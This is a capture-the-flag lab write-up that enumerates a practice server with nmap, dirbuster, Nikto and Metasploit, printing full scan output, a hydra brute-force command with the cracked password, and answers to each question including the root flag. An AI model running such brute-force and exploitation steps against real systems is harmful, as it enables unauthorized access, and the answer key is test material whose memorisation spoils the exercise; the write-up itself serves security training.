Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit


Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.  

This task requires you to use the following tools:

-   Dirbuster
-   Hydra
-   Nmap
-   Nikto
-   Metasploit


**NMAP**
`
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-12 21:33 IST  
NSE: Loaded 151 scripts for scanning.  
NSE: Script Pre-scanning.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 21:33  
Completed NSE at 21:33, 0.00s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 21:33  
Completed NSE at 21:33, 0.00s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 21:33  
Completed NSE at 21:33, 0.00s elapsed  
Initiating Ping Scan at 21:33  
Scanning 10.10.0.144 \[2 ports\]  
Completed Ping Scan at 21:33, 0.36s elapsed (1 total hosts)  
Initiating Parallel DNS resolution of 1 host. at 21:33  
Completed Parallel DNS resolution of 1 host. at 21:33, 0.01s elapsed  
Initiating Connect Scan at 21:33  
Scanning 10.10.0.144 \[1000 ports\]  
Discovered open port 22/tcp on 10.10.0.144  
Discovered open port 80/tcp on 10.10.0.144  
Discovered open port 1234/tcp on 10.10.0.144  
Discovered open port 8009/tcp on 10.10.0.144  
Completed Connect Scan at 21:34, 27.98s elapsed (1000 total ports)  
Initiating Service scan at 21:34  
Scanning 4 services on 10.10.0.144  
Completed Service scan at 21:34, 9.75s elapsed (4 services on 1 host)  
NSE: Script scanning 10.10.0.144.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 21:34  
Completed NSE at 21:34, 10.21s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 21:34  
Completed NSE at 21:34, 1.47s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 21:34  
Completed NSE at 21:34, 0.00s elapsed  
Nmap scan report for 10.10.0.144  
Host is up, received syn-ack (0.36s latency).  
Scanned at 2021-06-12 21:33:53 IST for 50s  
Not shown: 996 closed ports  
Reason: 996 conn-refused  
PORT     STATE SERVICE REASON  VERSION  
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 72:6f:1c:b0:72:56:bb:32:38:9e:5c:78:58:90:44:a3 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhHAS2WZpUTp0/rL6JA5llofNeNqX4HhEpdffjxPBRpw7dx6K3JTjydBpPmNE6oUsOrDFoF3lAi+wYdyoYrXXUIQFT  
j266F46mChRiBu7/oMaIrXzG5LT2vpRRFQGqdZd5ga8/UFUPnFFUzwFnJp79QVEZTtjUN6nKCw+58BkQtAr995AfBaVOhryVsn5JpnXx5evr4eXK3tFILnt6Oe5PEM22Rc  
qUeG1TBk+DmsYX3zj/dqqTuFDOgof4tnNP9ewss+2UBiS0VJAv5IZlBUsubDQ4ayCJuYqeJ6C9Fc8q1rOMJo6JxdvkTRSdxi5GaZSezdU6SoBHAmv6G8EH3h47  
|   256 b7:76:1b:ff:b6:4f:fb:8b:2f:94:17:9b:36:74:60:85 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHG6KC+ahwWfopDemQin5c5m8gHbH6YXmKwBiPpZ8js7Z9VvTuadpaOG  
glrxnnquh6hq4cZnH1cBosGyxsheNjk=  
|   256 5c:d9:57:63:98:21:14:08:be:99:04:93:9f:98:24:3f (ED25519)  
|\_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPw6UVZWx3X1HRU7J89xTPXkWQ+xVQxNoDDiesUW2itK  
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))  
| http-methods:    
|\_  Supported Methods: GET HEAD POST OPTIONS  
|\_http-server-header: Apache/2.4.18 (Ubuntu)  
|\_http-title: Site doesn't have a title (text/html).  
1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1  
|\_http-favicon: Apache Tomcat  
| http-methods:    
|\_  Supported Methods: GET HEAD POST OPTIONS  
|\_http-server-header: Apache-Coyote/1.1  
|\_http-title: Apache Tomcat/7.0.88  
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)  
|\_ajp-methods: Failed to get a valid response for the OPTION request  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel  
  
NSE: Script Post-scanning.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 21:34  
Completed NSE at 21:34, 0.00s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 21:34  
Completed NSE at 21:34, 0.00s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 21:34  
Completed NSE at 21:34, 0.00s elapsed  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 50.25 seconds
`



1. What directory can you find, that begins with a "g"?

*HINT:* Use dirbuster
*ANSWER:*  /guidelines

2. Whose name can you find from this directory?

*ANSWER:* bob

3. What directory has basic authentication?

*ANSWER:* /protected


4. What is bob's password to the protected part of the website?

`
ashik@whitedevil:~$ hydra -l bob -P rockyou.txt -t 1 -f 10.10.0.144 http-get /protected/  
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-12 22:15:45  
\[DATA\] max 1 task per 1 server, overall 1 task, 14344398 login tries (l:1/p:14344398), ~14344398 tries per task  
\[DATA\] attacking http-get://10.10.0.144:80/protected/  
\[80\]\[http-get\] host: 10.10.0.144 login: bob password: bubbles  
\[STATUS\] attack finished for 10.10.0.144 (valid pair found)  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-12 22:16:26
`

![[Pasted image 20210612213229.png]]

*ANSWER:* bubbles

5. What other port that serves a webs service is open on the machine?

*ANSWER:* 1234

Going to the service running on that port, what is the name and version of the software?

6. Answer format: Full\_name\_of\_service/Version

*ANSWER:* Apache Tomcat/7.0.88

Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.

7. How many documentation files did Nikto identify?

*ANSWER:* 5

8. What is the server version (run the scan against port 80)?

*ANSWER:* Apache/2.4.18

9. What version of Apache-Coyote is this service using?

*ANSWER:* 1.1

Use Metasploit to exploit the service and get a shell on the system.

10. What user did you get a shell as?

*ANSWER:* root

11. What text is in the file /root/flag.txt

*ANSWER:* ff1fc4a81affcc7688cf89ae7dc6e0e1